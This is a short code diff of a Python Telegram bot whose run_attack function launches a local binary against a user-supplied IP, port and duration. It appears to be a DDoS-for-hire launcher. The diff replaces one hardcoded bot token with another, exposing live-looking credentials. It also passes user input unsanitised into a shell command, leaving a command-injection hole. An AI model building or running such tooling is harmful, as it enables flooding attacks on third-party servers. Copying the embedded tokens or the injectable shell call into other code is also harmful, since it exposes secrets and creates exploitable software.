@@ -5,7 +5,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from telegram.error import TelegramError
 
-TELEGRAM_BOT_TOKEN = '7146402999:AAGAgCJecQhmTsp8RWcm2bCWkVkhC-yjLuI'
+TELEGRAM_BOT_TOKEN = '7248587968:AAHt1bxti3sXmVc1QsvP9oupMdrBwu38H2k'
 ADMIN_USER_ID = 6712658978  
 bot_access_free = True
 
@@ -57,7 +57,7 @@ async def start(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./LEGEND {ip} {port} {duration}",
+            f"./RK {ip} {port} {duration} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
